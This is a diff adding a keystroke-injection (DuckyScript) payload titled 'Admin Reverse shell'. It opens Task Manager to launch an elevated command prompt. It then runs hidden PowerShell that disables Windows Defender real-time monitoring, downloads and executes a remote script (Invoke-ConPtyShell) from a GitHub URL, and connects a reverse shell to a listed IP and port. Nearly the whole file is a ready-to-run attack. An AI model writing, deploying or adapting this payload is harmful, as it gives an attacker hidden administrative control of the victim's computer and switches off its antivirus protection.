@@ -1,0 +1,27 @@
+REM Title: Admin Reverse shell
+REM Author: Naitik Dharmendra Joshi
+
+DELAY 300
+GUI r
+DELAY 20
+REM --> Opens Task Manager
+STRING taskmgr
+ENTER
+DELAY 150
+ALT
+ENTER
+ENTER
+DELAY 150
+REM --> Starts CMD
+STRING cmd
+TAB
+REM --> Turn On Admin Privileges
+SPACE
+DELAY 1000
+REM --> Run
+ENTER
+DELAY 20
+
+REM --> Kills TaskManager, Executes PowerShell Commands (Hidden), Disables Windows Defender and Executes a Reverse Shell
+STRING taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.50.228 6666";
+ENTER
